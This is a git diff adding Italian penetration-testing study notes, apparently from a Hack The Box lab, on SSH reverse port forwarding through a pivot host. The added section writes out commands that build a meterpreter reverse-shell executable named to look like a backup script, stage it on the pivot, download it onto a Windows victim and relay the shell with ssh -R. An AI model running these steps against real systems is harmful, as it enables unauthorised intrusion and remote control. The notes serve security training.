@@ -172,3 +172,32 @@ Si puo' usare anche metasploit con proxychains. Semplicemente deve essere starta
 `j4k1dibe@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`
 
 
+# Remote/Reverse Port Forwarding with SSH
+
+Per ora abbiamo visto local port forwarding dove SSH puo' ascoltare nella nostra macchina locale e forwardare un servizio remoto ad una porta nostra.
+
+
+Ma se invece vogliamo una reverse shell?
+
+Se startiamo un Listener nella nostra macchina la vittima non riuscira' a raggiungerci.
+
+In questi casi dovremmo trovare un pivot host che e' una connessione comune tra il nostro attack host e la vittima
+
+### Creare il payload con msfvenom
+QUindi come LHOST metteremo non il nostro IP ma quello del pivot
+
+`j4k1dibe@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`
+
+### Trasferiamo payload al pivot host
+`j4k1dibe@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`
+
+### Scarichiamo payload wulla vittima
+
+`ubuntu@Webserver$ python3 -m http.server 8123`, startiamo server http sul pivot host
+
+`PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`, scarichiamo al pivot sulla vittima
+
+### Usiamo SSH -R
+`j4k1dibe@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`
+
+Se ci eravamo messi in ascolto sulla macchina principale cosi' riceviamo una shell.
